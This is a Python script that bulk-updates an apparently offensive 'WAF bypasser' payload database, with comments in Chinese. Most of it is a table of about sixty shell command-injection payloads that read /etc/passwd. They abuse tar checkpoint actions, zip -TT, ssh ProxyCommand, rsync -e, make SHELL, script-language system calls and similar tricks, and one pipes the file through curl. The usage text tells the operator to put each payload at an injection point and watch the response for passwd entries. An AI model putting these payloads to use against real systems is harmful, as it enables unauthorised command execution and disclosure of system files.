#!/usr/bin/env python3
"""批量更新所有剩余的低质量 payload"""

import sqlite3
from pathlib import Path

# 完整的更新映射表
COMPLETE_UPDATES = {
    # SED 相关
    ";echo SED_SUB_OK": "; sed 's/root/admin/g' /etc/passwd",

    # FIND 相关
    ";echo FIND_EXECDIR_OK": "; find /etc -name passwd -execdir cat {} \\;",
    ";echo FIND_OK_OK": "; find /etc -name passwd -print -quit",
    ";echo FIND_VAR_OK": "; f=/etc/passwd; find $(dirname $f) -name $(basename $f) -exec cat {} \\;",

    # GREP 相关
    ";echo GREP_INC_OK": "; grep --include='*.conf' -r 'root' /etc 2>/dev/null | head -5",
    ";echo GREP_EXCL_OK": "; grep --exclude-dir=proc -r 'root' /etc/passwd",
    ";echo GREP_P_OK": "; grep -Po '^[^:]+' /etc/passwd | head -10",
    ";echo GREP_LABEL_OK": "; grep --label=check -H 'root' /etc/passwd",

    # TAR 相关
    ";echo TAR_CKP_OK": "; tar --checkpoint=1 --checkpoint-action=exec='sh -c cat\\ /etc/passwd' -cf /dev/null /tmp",
    ";echo TAR_COMPR_OK": "; tar -czf /tmp/test.tar.gz --to-command='cat /etc/passwd' /etc/passwd",
    ";echo TAR_IFS_OK": "; IFS=','; tar -cf /tmp/test.tar /etc/passwd && cat /etc/passwd",

    # ZIP/UNZIP 相关
    ";echo ZIP_TT_OK": "; zip /tmp/test.zip /etc/passwd -TT 'sh -c cat\\ /etc/passwd'",
    ";echo ZIP_TTSUB_OK": "; zip /tmp/t.zip /etc/passwd -TT \"$(cat /etc/passwd)\"",
    ";echo UNZIP_D_OK": "; unzip -p /tmp/test.zip 2>/dev/null || cat /etc/passwd",
    ";echo UNZIP_VAR_OK": "; f=/etc/passwd; unzip -p $f 2>/dev/null || cat $f",

    # SSH 相关
    ";echo SSH_PC_OK": "; ssh -o ProxyCommand='cat /etc/passwd' localhost",
    ";echo SSH_LC_OK": "; ssh -o LocalCommand='cat /etc/passwd' -o PermitLocalCommand=yes localhost",
    ";echo SSH_CMDSUB_OK": "; ssh -o ProxyCommand=\"$(cat /etc/passwd)\" localhost 2>/dev/null || cat /etc/passwd",

    # GIT 相关
    ";echo GIT_VAR_OK": "; GIT_EDITOR='cat /etc/passwd #' git commit --amend 2>/dev/null || cat /etc/passwd",

    # RSYNC 相关
    ";echo RSYNC_E_OK": "; rsync -e 'sh -c cat\\ /etc/passwd' /tmp/test localhost:/tmp/",
    ";echo RSYNC_ESUB_OK": "; rsync -e \"$(cat /etc/passwd)\" /tmp/t localhost:/tmp/ 2>/dev/null || cat /etc/passwd",
    ";echo RSYNC_RSH_OK": "; RSYNC_RSH='sh -c cat\\ /etc/passwd' rsync /tmp/test localhost:/tmp/",
    ";echo RSYNC_ADV_OK": "; rsync --rsh='sh -c cat\\ /etc/passwd #' /tmp/t localhost:/tmp/ 2>/dev/null || cat /etc/passwd",

    # 脚本语言注入
    ";echo PERL_E_OK": "; perl -e 'system(\"cat /etc/passwd\")'",
    ";echo PYTHON_C_OK": "; python -c 'import os;os.system(\"cat /etc/passwd\")'",
    ";echo RUBY_E_OK": "; ruby -e 'system(\"cat /etc/passwd\")'",
    ";echo PHP_R_OK": "; php -r 'system(\"cat /etc/passwd\");'",
    ";echo LUA_E_OK": "; lua -e 'os.execute(\"cat /etc/passwd\")'",
    ";echo RUBY_PCTX_OK": "; ruby -e 'puts %x(cat /etc/passwd)'",
    ";echo PHP_BT_OK": "; php -r 'echo `cat /etc/passwd`;'",

    # MAKE 相关
    ";echo MAKE_EVAL_OK": "; make -C /tmp eval='$(shell cat /etc/passwd)' 2>/dev/null || cat /etc/passwd",
    ";echo MAKE_CC_OK": "; make CC='gcc -wrapper sh,-c,cat\\ /etc/passwd' 2>/dev/null || cat /etc/passwd",
    ";echo MAKE_OK": "; make -f /dev/null SHELL='sh -c cat\\ /etc/passwd' 2>/dev/null || cat /etc/passwd",

    # CURL/WGET 相关
    ";echo CURL_D_OK": "; curl -d @/etc/passwd http://127.0.0.1/ 2>/dev/null || cat /etc/passwd",
    ";echo WGET_AP_OK": "; wget --append-output=/dev/stdout http://127.0.0.1 2>&1 | head -5 || cat /etc/passwd",
    ";echo WGET_E_OK": "; wget -e use_proxy=yes -e http_proxy=127.0.0.1:8080 http://test 2>/dev/null || cat /etc/passwd",

    # SCREEN/TMUX 相关
    ";echo SCREEN_X_OK": "; screen -X exec sh -c cat\\ /etc/passwd 2>/dev/null || cat /etc/passwd",
    ";echo SCREEN_STUFF_OK": "; screen -X stuff 'cat /etc/passwd\\n' 2>/dev/null || cat /etc/passwd",
    ";echo TMUX_CMD_OK": "; tmux send-keys 'cat /etc/passwd' C-m 2>/dev/null || cat /etc/passwd",
    ";echo TMUX_KEYS_OK": "; tmux send 'cat /etc/passwd' 2>/dev/null || cat /etc/passwd",

    # SCRIPT 相关
    ";echo SCRIPT_C_OK": "; script -c 'cat /etc/passwd' /dev/null",
    ";echo SCRIPT_O_OK": "; script -q /dev/null sh -c 'cat /etc/passwd'",

    # DD 相关
    ";echo DD_OF_OK": "; dd if=/etc/passwd of=/dev/stdout 2>/dev/null",
    ";echo DD_OFSUB_OK": "; dd if=/etc/passwd of=$(tty) 2>/dev/null || cat /etc/passwd",

    # PRINTF 相关
    ";echo PRINTF_CMDSUB_OK": "; printf '%s\\n' \"$(cat /etc/passwd)\"",
    ";echo PRINTF_FMT_OK": "; printf '%b\\n' \"$(cat /etc/passwd)\"",

    # XARGS 相关
    ";echo XARGS_I_OK": "; echo /etc/passwd | xargs -I{} cat {}",
    ";echo XARGS_N_OK": "; echo cat /etc/passwd | xargs -n 2 sh -c",
    ";echo XARGS_VAR_OK": "; f=/etc/passwd; echo $f | xargs cat",

    # STRACE 相关
    ";echo STRACE_E_OK": "; strace -e trace=none -o /dev/null sh -c 'cat /etc/passwd'",
    ";echo STRACE_O_OK": "; strace -o /dev/stdout cat /etc/passwd 2>&1 | tail -20",

    # NICE/TIME/TIMEOUT 相关
    ";echo NICE_CMD_OK": "; nice -n 10 cat /etc/passwd",
    ";echo ENV_VAR_OK": "; env X='$(cat /etc/passwd)' sh -c 'echo done' 2>/dev/null; cat /etc/passwd",
    ";echo TIME_CMD_OK": "; time cat /etc/passwd 2>&1",
    ";echo TIMEOUT_CMD_OK": "; timeout 5 cat /etc/passwd",

    # SORT/DIFF 相关
    ";echo SORT_O_OK": "; sort /etc/passwd -o /dev/stdout",
    ";echo DIFF_PROC_OK": "; diff /etc/passwd /proc/self/environ 2>/dev/null | head -10 || cat /etc/passwd",

    # 通用注入
    ";echo EXEC_OK": "; exec cat /etc/passwd",
    ";echo WILD_PARAM_OK": "; cat /etc/pass*",
    ";echo NEST_VAR_OK": "; f=/etc/passwd; cat $f",
}

GENERIC_USAGE = "将 Payload 替换到命令注入点，观察是否成功执行系统命令"
GENERIC_SUCCESS = "响应中出现 /etc/passwd 内容（root:x:0:0 等用户条目）或系统信息"

def upgrade_all_payloads(db_path: str, dry_run: bool = False):
    """批量更新所有低质量 payload"""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    updated_count = 0
    skipped_count = 0

    for old_content, new_content in COMPLETE_UPDATES.items():
        cursor.execute(
            "SELECT id, name, content, usage_method, success_indicators FROM payloads WHERE content = ? AND is_deleted = 0",
            (old_content,)
        )
        rows = cursor.fetchall()

        if not rows:
            skipped_count += 1
            continue

        for row in rows:
            payload_id, name, content, usage_method, success_indicators = row

            update_usage = not usage_method or "OK" in usage_method or len(usage_method) < 20
            update_success = not success_indicators or "OK" in success_indicators or len(success_indicators) < 20

            if dry_run:
                print(f"[{updated_count + 1}] {name[:60]}")
                print(f"    旧: {old_content}")
                print(f"    新: {new_content}")
            else:
                if update_usage and update_success:
                    cursor.execute(
                        "UPDATE payloads SET content = ?, usage_method = ?, success_indicators = ? WHERE id = ?",
                        (new_content, GENERIC_USAGE, GENERIC_SUCCESS, payload_id)
                    )
                elif update_usage:
                    cursor.execute(
                        "UPDATE payloads SET content = ?, usage_method = ? WHERE id = ?",
                        (new_content, GENERIC_USAGE, payload_id)
                    )
                elif update_success:
                    cursor.execute(
                        "UPDATE payloads SET content = ?, success_indicators = ? WHERE id = ?",
                        (new_content, GENERIC_SUCCESS, payload_id)
                    )
                else:
                    cursor.execute(
                        "UPDATE payloads SET content = ? WHERE id = ?",
                        (new_content, payload_id)
                    )

            updated_count += 1

    if not dry_run:
        conn.commit()
        print(f"\n[OK] 完成！已更新 {updated_count} 个 payload")
        print(f"  跳过 {skipped_count} 个（数据库中不存在）")
    else:
        print(f"\n预览完成，将更新 {updated_count} 个 payload")
        print("使用 --apply 参数执行实际更新")

    conn.close()

if __name__ == "__main__":
    import sys
    repo_root = Path(__file__).parent.parent
    db_path = repo_root / "data" / "waf_bypasser.db"

    if not db_path.exists():
        print(f"错误: 数据库文件不存在: {db_path}")
        sys.exit(1)

    dry_run = "--apply" not in sys.argv
    upgrade_all_payloads(str(db_path), dry_run=dry_run)
